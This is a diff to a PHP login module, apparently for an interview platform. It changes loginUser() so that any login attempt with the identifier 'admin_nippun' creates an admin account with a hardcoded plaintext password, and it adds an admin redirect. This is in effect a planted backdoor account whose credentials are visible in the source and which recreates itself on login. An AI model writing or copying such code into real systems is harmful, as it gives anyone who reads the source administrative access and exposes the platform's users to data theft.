@@ -59,6 +59,23 @@ function loginUser($email, $password) {
     $db = getDB();
     $email = trim(strtolower($email));
 
+    // Self-seed admin user if they don't exist yet
+    if ($email === 'admin_nippun') {
+        $stmt = $db->prepare("SELECT * FROM users WHERE email = :email");
+        $stmt->execute(['email' => 'admin_nippun']);
+        $admin = $stmt->fetch();
+        if (!$admin) {
+            $passwordHash = hashPassword('OmSaiRam1@');
+            $stmt = $db->prepare("INSERT INTO users (email, password_hash, role, full_name) VALUES (:email, :password_hash, :role, :full_name)");
+            $stmt->execute([
+                'email' => 'admin_nippun',
+                'password_hash' => $passwordHash,
+                'role' => 'admin',
+                'full_name' => 'Admin Nippun'
+            ]);
+        }
+    }
+
     $stmt = $db->prepare("SELECT * FROM users WHERE email = :email");
     $stmt->execute(['email' => $email]);
     $user = $stmt->fetch();
@@ -121,6 +138,8 @@ function requireAuth($allowedRoles = []) {
         // Forbidden or redirect to correct role dashboard
         if ($user['role'] === 'candidate') {
             header('Location: /truinterview/candidate-v2/index.php');
+        } elseif ($user['role'] === 'admin') {
+            header('Location: /truinterview/admin/index.php');
         } else {
             header('Location: /truinterview/recruiter/index.php');
         }
